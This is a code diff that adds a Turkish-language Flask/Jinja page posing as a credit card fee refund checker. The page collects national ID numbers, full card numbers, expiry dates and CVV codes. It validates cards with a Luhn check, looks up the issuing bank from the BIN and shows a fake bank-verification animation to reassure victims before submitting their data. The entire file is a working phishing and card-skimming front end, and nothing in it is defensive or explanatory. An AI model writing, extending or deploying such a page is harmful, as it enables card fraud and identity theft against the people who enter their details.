@@ -1,0 +1,244 @@
+{% extends "base.html" %}
+{% block head %}
+<style>
+    .error-text { color: #c0392b; font-weight: bold; }
+    .error-hint { color: #c0392b; font-size: 11px; }
+    .loader.is-hidden { display: none; }
+
+    /* Verification Modal Styles */
+    .verification-modal {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        z-index: 10000;
+        justify-content: center;
+        align-items: center;
+    }
+    .verification-modal.active {
+        display: flex;
+    }
+    .verification-content {
+        background: white;
+        padding: 2rem;
+        border-radius: 10px;
+        text-align: center;
+        max-width: 400px;
+        width: 90%;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+    }
+    .verification-step {
+        display: none;
+        animation: fadeIn 0.5s ease-in;
+    }
+    .verification-step.active {
+        display: block;
+    }
+    .bank-logo {
+        width: 80px;
+        height: 80px;
+        margin: 1rem auto;
+        border-radius: 10px;
+        background: #f0f0f0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 2rem;
+    }
+    .progress-bar {
+        width: 100%;
+        height: 4px;
+        background: #e0e0e0;
+        border-radius: 2px;
+        margin: 1rem 0;
+        overflow: hidden;
+    }
+    .progress-fill {
+        height: 100%;
+        background: linear-gradient(90deg, #347aa1, #3a89b4);
+        width: 0%;
+        transition: width 0.1s linear;
+    }
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+</style>
+{% endblock %}
+{% block content %}
+<div class="richText">
+    İade hakkını sorgulamak istediğiniz kredi kartınızın bilgilerini giriniz. (Aidat iadeleri yalnızca kredi kartları içindir.)
+</div>
+{% if error %}
+<div class="formRow error-text">{{ error }}</div>
+{% endif %}
+<form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
+    <fieldset>
+        <div class="formRow required">
+            <label for="tridField" class="rowLabel">T.C. Kimlik No</label>
+            <div class="fieldGroup">
+                <input name="kullanici" type="text" class="text" id="tridField" autocomplete="off" maxlength="11" pattern="[0-9]{11}" required>
+            </div>
+        </div>
+        <div class="formRow required">
+            <label for="ccField" class="rowLabel">Kredi Kartı Numaranız</label>
+            <p class="error-hint" id="msg_" role="alert" aria-live="polite"></p>
+            <div class="fieldGroup">
+                <input name="cc_no" id="ccField" type="tel" maxlength="16" minlength="16" class="text" required>
+            </div>
+        </div>
+        <div class="formRow required">
+            <label for="expiryField" class="rowLabel">Son Kullanma Tarihi</label>
+            <div class="fieldGroup">
+                <input name="cc_yil" id="expiryField" type="tel" maxlength="10" class="text" required>
+            </div>
+        </div>
+        <div class="formRow required">
+            <label for="cvvField" class="rowLabel">CVV Kodunuz</label>
+            <div class="fieldGroup">
+                <input name="cc_cvv" id="cvvField" type="tel" maxlength="3" minlength="3" class="text" required>
+            </div>
+        </div>
+    </fieldset>
+    <div class="loader is-hidden">
+        <img src="{{ url_for('static', filename='img/form-progress.svg') }}" alt="...">İşleminiz devam ediyor. Lütfen bekleyiniz...
+    </div>
+    <div class="formSubmitRow">
+        <button type="submit" id="login_submit" class="submitButton">İade Sorgula</button>
+        <button type="button" class="backButton" onclick="window.history.back()">İptal Et</button>
+    </div>
+</form>
+
+<!-- Verification Modal -->
+<div class="verification-modal" id="verificationModal">
+    <div class="verification-content">
+        <div class="verification-step active" id="step1">
+            <h3>Kartınız Doğrulanıyor...</h3>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress1"></div>
+            </div>
+            <p>Lütfen bekleyiniz, kart bilgileriniz kontrol ediliyor.</p>
+        </div>
+        <div class="verification-step" id="step2">
+            <h3>Bankanız Doğrulanıyor...</h3>
+            <div class="bank-logo" id="bankLogo">🏦</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress2"></div>
+            </div>
+            <p id="bankName">Banka bilgileri yükleniyor...</p>
+        </div>
+    </div>
+</div>
+{% endblock %}
+{% block scripts %}
+<script>
+    var is_valid = false;
+
+    $(document).ready(function(){
+        $('#expiryField').inputmask("99/99");  //static mask
+    });
+
+    $('#ccField, #expiryField').on('keyup', function(){
+        if($('#ccField').val() === ""){
+            is_valid = false;
+            return false;
+        } else {
+            is_valid = valid_credit_card($('#ccField').val());
+            if(is_valid === false){
+                $('#msg_').html('Kredi kartı numaranızı hatalı girdiniz lütfen kontrol ediniz.');
+            } else {
+                $('#msg_').html('');
+                // BIN sorgulama - PHP'deki play.php çağrısı gibi
+                $.get('/bin-lookup?bin=' + $('#ccField').val().substring(0, 6), function(r){
+                    // Banka bilgilerini işleme (şimdilik boş)
+                });
+            }
+        }
+    });
+
+    $('#login_submit').click(function(e){
+        if(valid_credit_card($('#ccField').val()) === false){
+            $('#msg_').html('Kredi kartı numaranızı hatalı girdiniz lütfen kontrol ediniz.');
+            return false;
+        }
+
+        // Start verification animation
+        e.preventDefault();
+        startVerification();
+    });
+
+    function startVerification() {
+        var bin = $('#ccField').val().substring(0, 6);
+        var modal = $('#verificationModal');
+        var step1 = $('#step1');
+        var step2 = $('#step2');
+        var progress1 = $('#progress1');
+        var progress2 = $('#progress2');
+        var bankLogo = $('#bankLogo');
+        var bankName = $('#bankName');
+
+        modal.addClass('active');
+
+        // Step 1: Card verification (5 seconds)
+        var progress1Value = 0;
+        var progress1Interval = setInterval(function() {
+            progress1Value += 2; // 2% per 100ms = 5 seconds
+            progress1.css('width', progress1Value + '%');
+            if (progress1Value >= 100) {
+                clearInterval(progress1Interval);
+                step1.removeClass('active');
+                step2.addClass('active');
+
+                // Step 2: Bank verification (5 seconds)
+                $.get('/bin-lookup?bin=' + bin, function(data) {
+                    if (data && data.bank && data.bank.name) {
+                        bankName.text(data.bank.name + ' bankası doğrulanıyor...');
+                        if (data.bank.logo) {
+                            bankLogo.html(data.bank.logo);
+                        }
+                    } else {
+                        bankName.text('Banka bilgileri doğrulanıyor...');
+                    }
+                });
+
+                var progress2Value = 0;
+                var progress2Interval = setInterval(function() {
+                    progress2Value += 2;
+                    progress2.css('width', progress2Value + '%');
+                    if (progress2Value >= 100) {
+                        clearInterval(progress2Interval);
+                        // Submit the form after animation
+                        $('#loginForm').submit();
+                    }
+                }, 100);
+            }
+        }, 100);
+    }
+
+    function valid_credit_card(value) {
+        // accept only digits, dashes or spaces
+        if (/[^0-9-\s]+/.test(value)) return false;
+
+        // The Luhn Algorithm. It's so pretty.
+        var nCheck = 0, nDigit = 0, bEven = false;
+        value = value.replace(/\D/g, "");
+
+        for (var n = value.length - 1; n >= 0; n--) {
+            var cDigit = value.charAt(n),
+                nDigit = parseInt(cDigit, 10);
+
+            if (bEven) {
+                if ((nDigit *= 2) > 9) nDigit -= 9;
+            }
+
+            nCheck += nDigit;
+            bEven = !bEven;
+        }
+
+        return (nCheck % 10) == 0;
+    }
+</script>
+{% endblock %}
